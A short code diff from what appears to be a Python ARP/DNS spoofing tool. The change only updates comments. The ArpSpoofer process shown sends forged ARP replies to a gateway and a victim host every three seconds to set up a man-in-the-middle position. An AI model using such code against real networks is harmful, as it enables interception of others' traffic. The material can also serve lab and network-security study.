@@ -8,9 +8,9 @@ class ArpSpoofer(multiprocessing.Process):
         self.exit = multiprocessing.Event()
     def run(self):
         while not self.exit.is_set():
-            #gateway
+            # gateway's IP and victim's mac addr
             dnsspoofer.spoof_arp(b"\x01\x02\x03\x04\x05\x06",b"192.168.1.1", b"em1")
-            #victim
+            # victim's IP and gateway's mac addr
             dnsspoofer.spoof_arp(b"\x55\x44\x33\x22\x11\x22",b"192.168.1.100", b"em1")
             time.sleep(3)
     def terminate(self):
